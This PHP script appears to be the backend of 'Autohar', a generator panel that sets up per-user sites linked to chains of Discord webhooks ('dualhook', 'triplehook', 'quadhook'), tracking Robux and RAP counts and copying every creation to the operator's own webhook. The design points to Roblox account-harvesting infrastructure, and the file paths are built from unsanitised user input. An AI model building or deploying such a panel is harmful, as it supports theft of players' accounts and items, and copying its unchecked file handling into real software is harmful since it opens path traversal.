<?php
require("../include.php");
session_start();
header("content-type: application/json");
$post = json_decode(file_get_contents("php://input"), true);
if (!isset($_SERVER["HTTP_REFERER"])) {
    http_response_code(403);
    die(json_encode(["error" => ["message" => "Access Denied"]]));
};
function genkey($length = 40) {
    $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomKey = '';
    for ($i = 0; $i < $length; $i++) {
        $randomKey .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomKey;
};
if (isset($post["name"]) && !empty($post["name"]) && isset($post["hook"]) && !empty($post["hook"])) {
    if (!is_dir(__DIR__ . "/../../auth")) {
        mkdir(__DIR__ . "/../../auth", 0755, true);
    };
    if (!is_dir(__DIR__ . "/../../r")) {
        mkdir(__DIR__ . "/../../r", 0755, true);
    };
    if (!is_dir(__DIR__ . "/../../auth/dualhook")) {
        mkdir(__DIR__ . "/../../auth/dualhook", 0755, true);
    };
    if (!is_dir(__DIR__ . "/../../auth/triplehook")) {
        mkdir(__DIR__ . "/../../auth/triplehook", 0755, true);
    };
    if (!is_dir(__DIR__ . "/../../auth/quadhook")) {
        mkdir(__DIR__ . "/../../auth/quadhook", 0755, true);
    };
    if (!filter_var($post["hook"], FILTER_VALIDATE_URL)) {
        http_response_code(403);
        die(json_encode(["error" => ["message" => "Webhook isn't a valid URL!"]]));
    };
    if (!preg_match('/^https:\/\/(discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+)$/', $post["hook"])) {
        http_response_code(403);
        die(json_encode(["error" => ["message" => "Webhook is not valid!"]]));
    };
    if (isset($post["discord"]) && !empty($post["discord"])) {
        if(isset($post["quadhook"]) && !empty($post["quadhook"])) {
            $json = [
                "webhook" => $post["hook"],
                "discord" => $post["discord"]
            ];
            if (file_exists(__DIR__ . "/../../auth/quadhook/" . $post["name"] . ".json")) {
                http_response_code(403);
                die(json_encode(["error" => ["message" => "Site with name " . $post["name"] . " already exists!"]]));
            };
            if (!file_put_contents(__DIR__ . "/../../auth/quadhook/" . $post["name"] . ".json", json_encode($json, JSON_PRETTY_PRINT))) {
                http_response_code(403);
                die(json_encode(["error" => ["message" => "Site with name " . $post["name"] . " already exists!"]]));
            };
            $link = "https://" . $_SERVER['HTTP_HOST'] . "/created/" . $post["name"];
            $embed = [
                "embeds" => [[
                    "title" => "<:link:1335417333988196403> Autohar Quadhook Created!",
                    "description" => "```{$link}```",
                    "color" => hexdec("FF4654"),
                    "thumbnail" => ["url" => $setup["SiteLogo"]],
                    "footer" => [
                        "text" => "Made with love by Zxeno",
                        "icon_url" => $setup["SiteLogo"]
                    ]
                ]]
            ];
            $payload = json_encode([
                "username" => $setup["SiteName"] . " - Created",
                "avatar_url" => $setup["SiteLogo"],
                "embeds" => $embed["embeds"]
            ]);
            send_webhook($post["hook"], $payload);
            send_webhook($setup["GenHook"], $payload);
            die(json_encode(["success" => ["message" => "Created"]]));
        };
        if (isset($post["triplehook"]) && !empty($post["triplehook"])) {
            if (isset($post["secret"])) {
                $data = json_decode(file_get_contents(__DIR__ . "/../../auth/quadhook/" . $post["secret"] . ".json"), true);
                $json = [
                    "webhook" => $post["hook"],
                    "discord" => $post["discord"],
                    "quadhook" => $data["webhook"]
                ];
            } else {
                $json = [
                   "webhook" => $post["hook"],
                    "discord" => $post["discord"]
                ];
            };
            if (file_exists(__DIR__ . "/../../auth/triplehook/" . $post["name"] . ".json")) {
                http_response_code(403);
                die(json_encode(["error" => ["message" => "Site with name " . $post["name"] . " already exists!"]]));
            };
            if (!file_put_contents(__DIR__ . "/../../auth/triplehook/" . $post["name"] . ".json", json_encode($json, JSON_PRETTY_PRINT))) {
                http_response_code(403);
                die(json_encode(["error" => ["message" => "Site with name " . $post["name"] . " already exists!"]]));
            };
            $link = "https://" . $_SERVER['HTTP_HOST'] . "/creates/" . $post["name"];
            $embed = [
                "embeds" => [[
                    "title" => "<:link:1335417333988196403> Autohar Triplehook Created!",
                    "description" => "```{$link}```",
                    "color" => hexdec("FF4654"),
                    "thumbnail" => ["url" => $setup["SiteLogo"]],
                    "footer" => [
                        "text" => "Made with love by Zxeno",
                        "icon_url" => $setup["SiteLogo"]
                    ]
                ]]
            ];
            $payload = json_encode([
                "username" => $setup["SiteName"] . " - Created",
                "avatar_url" => $setup["SiteLogo"],
                "embeds" => $embed["embeds"]
            ]);
            send_webhook($post["hook"], $payload);
            send_webhook($setup["GenHook"], $payload);
            die(json_encode(["success" => ["message" => "Created"]]));
        };
        if (isset($post["secret"])) {
            $data = json_decode(file_get_contents(__DIR__ . "/../../auth/triplehook/" . $post["secret"] . ".json"), true);
            if (isset($data["quadhook"])) {
                $json = [
                    "webhook" => $post["hook"],
                    "discord" => $post["discord"],
                    "triplehook" => $data["webhook"],
                    "quadhook" => $data["quadhook"]
                ];
            } else {
                $json = [
                    "webhook" => $post["hook"],
                    "discord" => $post["discord"],
                    "triplehook" => $data["webhook"]
                ];
            };
        } else {
            $json = [
                "webhook" => $post["hook"],
                "discord" => $post["discord"]
            ];
        };
        if (file_exists(__DIR__ . "/../../auth/dualhook/" . $post["name"] . ".json")) {
            http_response_code(403);
            die(json_encode(["error" => ["message" => "Site with name " . $post["name"] . " already exists!"]]));
        };
        if (!file_put_contents(__DIR__ . "/../../auth/dualhook/" . $post["name"] . ".json", json_encode($json, JSON_PRETTY_PRINT))) {
            http_response_code(403);
            die(json_encode(["error" => ["message" => "Site with name " . $post["name"] . " already exists!"]]));
        };
        $link = "https://" . $_SERVER['HTTP_HOST'] . "/create/" . $post["name"];
        $embed = [
            "embeds" => [[
                "title" => "<:link:1335417333988196403> Autohar Dualhook Created!",
                "description" => "```{$link}```",
                "color" => hexdec("FF4654"),
                "thumbnail" => ["url" => $setup["SiteLogo"]],
                "footer" => [
                    "text" => "Made with love by Zxeno",
                    "icon_url" => $setup["SiteLogo"]
                ]
            ]]
        ];
        $payload = json_encode([
            "username" => $setup["SiteName"] . " - Created",
            "avatar_url" => $setup["SiteLogo"],
            "embeds" => $embed["embeds"]
        ]);
        send_webhook($post["hook"], $payload);
        send_webhook($setup["GenHook"], $payload);
        die(json_encode(["success" => ["message" => "Created"]]));
    } else {
        $authkey = genkey();
        if (isset($post["secret"]) && !empty($post["secret"])) {
            $data = json_decode(file_get_contents(__DIR__ . "/../../auth/dualhook/" . $post["secret"] . ".json"), true);
            if (isset($data["triplehook"])) {
                if (isset($data["quadhook"])) {
                    $json = [
                        "webhook" => $post["hook"],
                        "authkey" => $authkey,
                        "robux" => 0,
                        "rap" => 0,
                        "summary" => 0,
                        "dualhook" => $data["webhook"],
                        "triplehook" => $data["triplehook"],
                        "quadhook" => $data["quadhook"]
                    ];
                } else {
                    $json = [
                        "webhook" => $post["hook"],
                        "authkey" => $authkey,
                        "robux" => 0,
                        "rap" => 0,
                        "summary" => 0,
                        "dualhook" => $data["webhook"],
                        "triplehook" => $data["triplehook"]
                    ];
                };
            } else {
                $json = [
                    "webhook" => $post["hook"],
                    "authkey" => $authkey,
                    "robux" => 0,
                    "rap" => 0,
                    "summary" => 0,
                    "dualhook" => $data["webhook"]
                ];
            };
        } else {
            $json = [
                "webhook" => $post["hook"],
                "authkey" => $authkey,
                "robux" => 0,
                "rap" => 0,
                "summary" => 0
            ];
        };
        if (file_exists(__DIR__ . "/../../auth/" . $post["name"] . ".json")) {
            http_response_code(403);
            die(json_encode(["error" => ["message" => "Site with name " . $post["name"] . " already exists!"]]));
        };
        if (!file_put_contents(__DIR__ . "/../../auth/" . $post["name"] . ".json", json_encode($json, JSON_PRETTY_PRINT))) {
            http_response_code(403);
            die(json_encode(["error" => ["message" => "Site with name " . $post["name"] . " already exists!"]]));
        };
        unset($_SESSION["auth_name"]);
        unset($_SESSION["auth_key"]);
        $_SESSION["auth_name"] = $post["name"];
        $_SESSION["auth_key"] = $authkey;
        $embed = [
            "embeds" => [[
                "title" => "<:link:1335417333988196403> Autohar Created!",
                "description" => "**[Dashboard](https://{$_SERVER['HTTP_HOST']}/controller/dashboard?key=" . $authkey . "&name=" . $post["name"] . ") | [Sign In](https://{$_SERVER['HTTP_HOST']}/controller/sign-in?name=" . $post["name"] . ")**",
                "color" => hexdec("FF4654"),
                "thumbnail" => [
                    "url" => $setup["SiteLogo"]
                ],
                "footer" => [
                    "text" => "Made with love by Zxeno",
                    "icon_url" => $setup["SiteLogo"]
                ],
                "fields" => [
                    ["name" => "<:pin:1335417284843536436> AuthKey", "value" => "```{$authkey}```", "inline" => true]
                ]
            ]]
        ];
        $payload = json_encode([
            "username" => $setup["SiteName"] . " - Created",
            "avatar_url" => $setup["SiteLogo"],
            "embeds" => $embed["embeds"]
        ]);
        send_webhook($post["hook"], $payload);
        send_webhook($setup["GenHook"], $payload);
        if (isset($post["secret"])) {
            send_webhook($post["secret"], $payload);
        }
        die(json_encode(["error" => ["message" => "Site Created!"]]));
    };
} else {
    http_response_code(403);
    die(json_encode(["error" => ["message" => "You must fill the form out!"]]));
};
?>